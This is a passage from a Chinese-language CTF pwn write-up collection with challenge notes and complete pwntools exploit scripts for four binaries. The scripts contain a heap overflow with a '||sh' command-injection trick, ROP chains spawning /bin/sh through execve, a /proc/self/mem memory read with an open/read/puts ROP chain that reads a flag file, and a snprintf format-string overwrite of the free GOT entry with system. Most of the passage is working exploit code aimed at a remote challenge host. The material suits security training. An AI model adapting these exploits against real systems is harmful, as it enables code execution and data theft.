    # ret = io.recvuntil(b'bye')
    io.sendline(b'/bin/sh\x00')
    io.interactive()
```

### 29. hacknote
题目：暂无

思路：常规的堆溢出漏洞，主要存在的一个问题是在构造system("/bin/sh")的时候，没有办法直接将/bin/sh字符串传给system，但是可以用XXXX||sh传给system，一样可以达到效果，类似于命令注入的方式。

全部源代码如下：
```python
from pwn import *
from LibcSearcher import *

debug = False
if debug:
    io = process('./hacknote')
else:
    io = remote('220.249.52.134', 45871)

elf = ELF('hacknote')

def add(size, data):
    io.sendlineafter(':', '1')
    io.sendlineafter(':', '%d' % size)
    io.sendafter(':', data)

def delete(index):
    io.sendlineafter(':', '2')
    io.sendlineafter(':', '%d' % index)

def prnt(index):
    io.sendlineafter(':', '3')
    io.sendlineafter(':', '%d' % index)

if __name__ == '__main__':
    # create node0 len: 0x100
    # create node1 len: 0x100
    # chunk0: puts, xx
    # chunk1: puts, xx
    add(0x100, b'0'*0x100)
    add(0x100, b'1'*0x100)

    # delete node0 and node1
    # prevent merge
    add(0x100, b'2'*0x100)
    delete(0)
    delete(1)
    # now fastbin has two chunk

    # create node3 len: 0x8
    # node3->data == chunk0
    # chunk0: puts, got.free
    payload = p32(0x0804862b) + p32(elf.got['puts'])
    add(0x8, payload)

    # print node0
    # puts(got.free)
    prnt(0)
    free_addr = u32(io.recv(4))
    log.success('free addr: 0x%x' % free_addr)

    libc = LibcSearcher('puts', free_addr)
    libc_base = free_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    log.success('system addr: 0x%x' % system_addr)

    # delete node3
    # fastbin has two chunk
    delete(3)

    # create node4, len:0x8
    # node4->data == chunk0
    # chunk0: system_addr,binsh_addr
    payload = p32(system_addr) + b'||sh'
    add(0x8, payload)
    # gdb.attach(io)
    # pause()

    # print node0
    # system(binsh_addr)
    prnt(0)
    io.interactive()
```

### 30. 250
题目：暂无

思路：常规的栈溢出漏洞。这个程序使用了静态编译，并且去除了sytem函数和/bin/sh字符串，因此通过ROP构造一个read函数读取/bin/sh字符串，然后通过int80调用execute("/bin/sh", 0, 0)获取shell。

全部利用代码如下：
```python
from pwn import *

debug = False
if debug:
    io = process('./250')
else:
    io = remote('220.249.52.134', 30525)

elf = ELF('250')

read_addr = 0x0806D510
pppr = 0x0806efb9
pop_eax = 0x080b89e6
pop_ebx = 0x080481c9
pop_ecx = 0x080df1b9
pop_edx = 0x0806efbb
int80 = 0x0806F5C0

if __name__ == '__main__':
    # ROP
    payload = b'A' * 0x3A + b'AAAA'
    # read(0, bss+500, 8)
    payload += p32(read_addr) + p32(pppr) + p32(0) + p32(elf.bss()+500) + p32(8)

    # execve("/bin/sh", 0, 0)
    # execve系统调用号0xb
    payload += p32(pop_eax) + p32(0xb)
    payload += p32(pop_ebx) + p32(elf.bss()+500)
    payload += p32(pop_ecx) + p32(0)
    payload += p32(pop_edx) + p32(0)
    payload += p32(int80)

    io.sendlineafter(']', '%d' % len(payload))
    io.send(payload)
    sleep(0.1)
    io.send(b'/bin/sh\x00')
    io.interactive()
```

### 31. house_of_gray
题目：暂无

思路：通过读取/proc/self/maps和/proc/self/mem文件实现进程任意地址空间内存读取找到elf加载基址和栈地址，再配合栈溢出修改变量实现对栈的写入，简介实现ROP攻击读取flag文件。

#### seccomp-tools
可以检查程序是否禁用了某些关键的系统调用。

#### /proc文件系统
/proc/self/maps(或者/proc/(pid)/maps,这个需要root权限)文件保存了当前进程的内存映射情况，可以找到elf文件的加载基址，堆和栈的地址范围。

/proc/self/mem(或者/proc/(pid)/mem,这个需要root权限)文件提供了一个读取当前进程任意内存地址的接口，但是再读取前需要使用seek指定到正确的地址范围（通过maps文件可以获取）。

#### gdb调试指令s,n,si,ni
s: 执行一行程序代码，如果此行代码中有函数调用，则进入该函数，相当于其它调试器中的“Step Into (单步跟踪进入)”

n: 执行一行程序代码，此行代码中的函数调用也一并执行，相当于其它调试器中的“Step Over (单步跟踪)”

s、n这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。

#### gdb多进程调试
如下的代码
```python
io = process('elf')
# do something
gdb.attach(io)
```
如果在gdb.attach之前进程已经创建了新的进程，那么gdb不会跟踪新的进程，如果还没有创建新进程，在后续程序在创建新的进程时会被gdb跟踪。因此如果想要跟踪新的进程，gdb.attach应该在创建新进程之前被调用，或者使用gdb.debug创建进程，调试时建议可以关闭aslr，方便下断点。
```python
io = gdb.debug('./elf', aslr=False, gdbscript='''
b main
continue
''')
```

#### 解题思路
通过逆向分析发现题目提供了读取任意文件任意位置内容（flag文件除外）和在堆空间写入数据的功能，此外在设置文件名时存在栈溢出漏洞。先用checksec查看elf的防护功能全开，普通的栈溢出肯定是不行的，仔细分析程序发现通过栈溢出可以覆盖buf后面一个写入地址指针变量，通过覆盖这个变量可以导致任意地址写入，这里的关键就是应该将这个变量覆盖成什么值。

由于开启了防护机制got表无法修改，只能修改全局数据或堆栈数据，全局数据和堆栈数据中都没有类似函数指针的变量可以利用，因此可以考虑直接修改堆栈中的返回地址，这里修改的是read函数的返回地址，read函数执行完成后就可以返回到我们控制的地址了，后续就可以使用常规ROP的方式实现我们需要的功能了。正好本题提供了读文件（任意位置）功能，可以通过读取/proc/self/maps和/proc/self/mem文件在内存中搜索栈中特殊字符串确定栈地址。由于可以确定栈中保存了/proc/self/mem这个字符串，因此可以通过在内存中搜索这个字符串确定这个临时变量的地址，进而确定栈的分布。这里还有个问题就是题目限定了读取文件的长度和次数，因此可能需要多次搜索才能得到正确的地址（大约1/7的概率可以找到）。

假设找到的栈空间是这样的：
```python
rsp（buf_addr-0x30）   --> read函数调用前的栈顶
buf_addr              --> /proc/self/mem
buf_addr+24           --> void *v8(写入指针)
```
那么调用read函数时，read的返回地址会压入栈内，因此read的返回地址是buf的地址-0x38，因此在栈溢出的payload应为：
```python
payload = b'/proc/self/mem'
payload = payload.ljust(24, b'\x00') + p64(buf_addr - 0x38)
```
这样再程序调用read(0, v8, 0x200)时就可以覆盖从read返回地址及其以下的内容了。这里存在一个坑，使用seccomp-tools dump ./house查看发现execve系统调用被禁用了，意味着无法执行/bin/sh获取shell，只能通过构造打开文件，读文件的方式获取flag了，rop链如下
```python
# open('/home/ctf/flag', 0)
read_ret_addr  -->pop_rdi
               -->flag_file_addr
               -->pop_rsi_r15
               -->0
               -->0
               -->open_addr
# read(6, flag_file_addr, 0x200)
               -->pop_rdi
# 这里6是上一个打开的文件描述符
# 由于系统默认占用了0，1，2
# 程序首先打开了/proc/self/maps，再打开了/proc/self/mem，最后栈溢出又打开了/proc/self/mem
# 因此新打开的文件描述符为6
               -->6
               -->pop_rsi_r15
               -->flag_file_addr
               -->0
# 这里没有找到pop_rdx的ROP指令
# 但是调试发现在调用read前rdx被设置的0x200在执行完后没变，因此不用设置rdx
               -->read_addr
# puts(flag_file_addr)
               -->pop_rdi
               -->flag_file_addr
               -->puts_addr
# 可以计算出flag_file_addr和buf_addr相差的距离为15*8
flag_file_addr -->/home/ctf/flag
```

全部利用代码如下：
```python
from pwn import *

debug = False
if debug:
    io = process('./house', aslr=False)
    gdb.attach(io, gdbscript='''
b *0x00005555555552bb
continue
''')
    pause()
else:
    io = remote('220.249.52.134', 41480)

elf = ELF('house')
pop_rdi = 0x1823
pop_rsi_r15 = 0x1821

def set_filename(filename):
    io.sendlineafter('Exit\n', '1')
    io.sendlineafter('?\n', filename)

def seek(offset):
    log.info('seek to: 0x%x' % offset)
    io.sendlineafter('Exit\n', '2')
    io.sendlineafter('?\n', '%d' % offset)

def read_content():
    io.sendlineafter('Exit\n', '3')
    io.sendlineafter('?\n', '100000')
    content = io.recvuntil('1.F')[19:-3]
    return content

# 在本地aslr开启、关闭、远程调试下/proc/self/maps输出的行序列不同
# 因此采用搜索的方法确定elf和mmap内存空间
def get_elf_mmap(lines):
    elf_line = None
    mmap_line = None
    for l in lines:
        base = int(l.split('-')[0], 16)
        end = int(l.split('-')[1].split(' ')[0], 16)
        if (end - base) == 0x10000000:
            mmap_line = l
        elif 'r-xp' in l and 'house' in l:
            elf_line = l
    return [elf_line, mmap_line]

if __name__ == '__main__':
    # enter room
    io.sendlineafter('?\n', 'y')

    # read /proc/self/maps
    set_filename('/proc/self/maps')
    content = read_content()
    lines = content.decode('utf8').strip().split('\n')
    for i in lines:
        print(i)

    # get elf and mmap base
    elf_line, mmap_line = get_elf_mmap(lines)
    elf_base = int(elf_line.split('-')[0], 16)
    mmap_base = int(mmap_line.split('-')[0], 16)
    print('elf base: 0x%x' % elf_base)
    print('mmap base: 0x%x' % mmap_base)
    read_addr = elf_base + elf.plt['read']
    open_addr = elf_base + elf.plt['open']
    puts_addr = elf_base + elf.plt['puts']
    pop_rdi += elf_base
    pop_rsi_r15 += elf_base

    # search stack addr
    set_filename('/proc/self/mem')
    # 尽量从中间开始搜索，不过效果差不太多
    addr_start = mmap_base + 0x7fffff - 1200000
    # seek只需要调用一次，后续读文件时指针会自动移动！！！
    seek(addr_start)
    buf_addr = None
    for i in range(24):
        content = read_content()
        if b'/proc/self/mem' in content:
            buf_addr = addr_start + i * 100000
            buf_addr += len(content.split(b'/proc/self/mem')[0])
            log.success('find buf addr: 0x%x' % buf_addr)
            break
        #pause()
    if not buf_addr:
        print('cannot find buf addr, try again!')
        exit(-1)
    read_ret_addr = buf_addr - 0x38
    log.success('read ret addr: 0x%x' % read_ret_addr)

    # read buf overflow v8 with read_ret_addr
    payload = b'/proc/self/maps'
    payload = payload.ljust(0x50-0x38, b'\x00') + p64(read_ret_addr)
    set_filename(payload)

    # write rop to read_ret_addr
    io.sendlineafter('Exit\n', '4')
    flag_str_addr = read_ret_addr + 15 * 8
    # open('/home/ctf/flag\x00', 0)
    payload = p64(pop_rdi) + p64(flag_str_addr) + p64(pop_rsi_r15) + p64(0) + p64(0)
    payload += p64(open_addr)
    # read(6, addr, 0x200)
    # now rdx is 0x200
    payload += p64(pop_rdi) + p64(6) + p64(pop_rsi_r15) + p64(flag_str_addr) + p64(0)
    payload += p64(read_addr)
    # puts(addr)
    payload += p64(pop_rdi) + p64(flag_str_addr) + p64(puts_addr)
    payload += b'/home/ctf/flag\x00'

    io.sendafter(':', payload)
    io.interactive()
```

### 32. EasyPwn
题目：暂无

思路：snprintf格式化字符串漏洞。

#### snprintf逻辑
snprintf的逻辑比较怪异，没有查到比较确切的原理，对于以下两种情况不知道为什么是这样的输出？
```c++
#include<stdio.h>

int main()
{
        char a[100] = "aaa%syyyyy";
        char b[100] = "bbbb%s";
        char c[100] = "ccc";
        puts(a);
        puts(b);
        puts(c);
        snprintf(a, 100, a+3, b, c);
        puts(a);
        return 0;
}

./a.out
aaa%syyyyy
bbbb%s
ccc
bbbb%ssssss

// 修改b
        char a[100] = "aaa%syyyyy";
        char b[100] = "bbbb%sA";
        char c[100] = "ccc";
输出变为
aaa%syyyyy
bbbb%sA
ccc
bbbb%sAsAsAscccccc�c�
```

对于这道题，使用snprintf泄露信息时也存在一个很怪异的地方。
```python
# 看了wp代码是这样的，是这样解释的：
# snprintf首先处理格式化字符串%s，将整个payload拷贝到缓冲区
# 这时候格式化字符串变为bb%396$p%397$p
# snprintf会继续处理2个字符以后的内容，因此可以正确泄露
payload = b'a'*1000 + b'bb%396$p%397$p'
# 下面这种也是一样的
payload = b'a'*1000 + b'%s%396$p%397$p'

# ！！！
# 但是如果覆盖的字符和前面的字符一样就会有问题
# 经调试发现变量数+1可以得到同样的效果，但是不知道为什么需要加1
payload = b'a'*1000 + b'aa%397$p%398$p'
```

全部利用代码如下：
```python
from pwn import *
from LibcSearcher import *

debug = True
if debug:
    io = process('./pwn1', aslr=False)
    #gdb.attach(io)
else:
    io = remote('220.249.52.134', 44156)

elf = ELF('pwn1')


if __name__ == '__main__':
    # leak init and __lib_start_main
    io.sendlineafter('Input Your Code:\n', '1')
    payload = b'a'*1000 + b'bb%396$p%397$p'
    #payload = b'a'*1000 + b'aa%397$p%398$p'
    io.sendafter('\n', payload)
    data = io.recvuntil('\n')
    print(data)

    __libc_start_main = int(data.decode('utf8').split('0x')[2][:-1], 16) - 0xf0
    log.success('__libc_start_main: 0x%x' % __libc_start_main)
    libc = LibcSearcher('__libc_start_main', __libc_start_main)
    libc_base = __libc_start_main - libc.dump('__libc_start_main')
    system_addr = libc_base + libc.dump('system')
    free_addr = libc_base + libc.dump('free')
    log.success('system: 0x%x' % system_addr)
    log.success('free: 0x%x' % free_addr)

    init_addr = int(data.decode('utf8').split('0x')[1], 16)
    elf_base = init_addr - 0xda0
    log.success('init: 0x%x' % init_addr)
    log.success('elf base: 0x%x' % elf_base)

    # load free to got
    io.sendlineafter('Input Your Code:\n', '2')
    io.sendlineafter('Input Your Name:\n', '2')

    # modify free got
    # last two bytes
    io.sendlineafter('Input Your Code:\n', '1')
    data1 = system_addr & 0xffff
    payload = b'a'*1000
    payload += (b'bb%' + str(data1 - 1022).encode('utf8') + b'c%133$hn').ljust(16, b'a')
    payload += p64(elf.got['free'] + elf_base)
    io.sendafter('\n', payload)
    # last 3,4 bytes
    io.sendlineafter('Input Your Code:\n', '1')
    data1 = system_addr & 0xffff0000
    data1 = data1 >> 16
    payload = b'a'*1000
    payload += (b'bb%' + str(data1 - 1022).encode('utf8') + b'c%133$hn').ljust(16, b'a')
    payload += p64(elf.got['free'] + elf_base + 2)
    io.sendafter('\n', payload)
    pause()

    # system
    io.sendlineafter('Input Your Code:\n', '2')
    io.sendafter('Input Your Name:\n', b'/bin/sh\x00')

    io.interactive()
```
